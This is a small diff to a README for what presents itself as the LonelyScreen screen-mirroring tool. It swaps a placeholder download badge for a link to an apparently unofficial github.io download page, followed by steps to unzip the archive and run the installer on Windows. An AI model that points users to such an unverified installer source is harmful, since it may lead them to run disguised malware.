@@ -8,7 +8,7 @@ It’s perfect for **teachers, streamers, presenters, and developers** who need 
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-darkgreen?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-darkgreen?style=for-the-badge)](https://lonelyscreen-download.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the **LonelyScreen Installer** on your Windows PC.  
